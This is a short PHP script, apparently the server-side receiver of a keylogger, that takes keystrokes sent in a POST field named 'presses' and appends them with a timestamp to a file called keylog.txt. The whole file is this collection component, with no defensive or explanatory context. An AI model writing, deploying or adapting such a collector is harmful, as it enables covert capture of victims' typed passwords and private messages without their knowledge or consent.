<?php
$file = fopen('keylog.txt', 'a+');
fwrite($file, date("Y-m-d H:i:s") . PHP_EOL . $_POST['presses'] . PHP_EOL);
fclose($file);
echo "OK";